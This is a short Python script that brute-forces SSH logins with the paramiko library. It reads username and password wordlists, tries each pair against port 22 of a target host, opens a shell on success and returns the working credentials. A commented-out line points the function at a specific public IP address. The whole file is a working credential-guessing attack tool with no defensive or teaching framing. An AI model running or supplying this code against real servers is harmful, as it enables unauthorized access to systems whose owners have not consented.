from time import sleep
import paramiko


def bruteforce(ip, default_username_list, default_password_list):
    try:
        default_password_list = default_password_list.strip()
        default_username_list = default_username_list.strip()
        hostname = str(ip.strip())
        list_username = open(default_username_list, 'r',
                             encoding='UTF-8').readlines()
        list_password = open(default_password_list, 'r',
                             encoding='UTF-8').readlines()

        for username in list_username:
            username = username.strip()
            print(
                f'\n[*] Trying connect to: {username}@{hostname}')
            for password in list_password:
                index = list_password.index(password)
                password = password.rstrip('\n')
                try:
                    print(f'[{index}] Trying with password: "{password}"')
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=hostname, port=22,
                                username=username, password=password, banner_timeout = 15)
                    shell = ssh.invoke_shell()
                    ssh.close()
                    return username, password
                except paramiko.AuthenticationException:
                    pass
                sleep(15)
    except KeyboardInterrupt:
        exit(1)


# bruteforce('54.251.17.75', 'data/wordlist/username.txt', 'data/wordlist/password.txt')
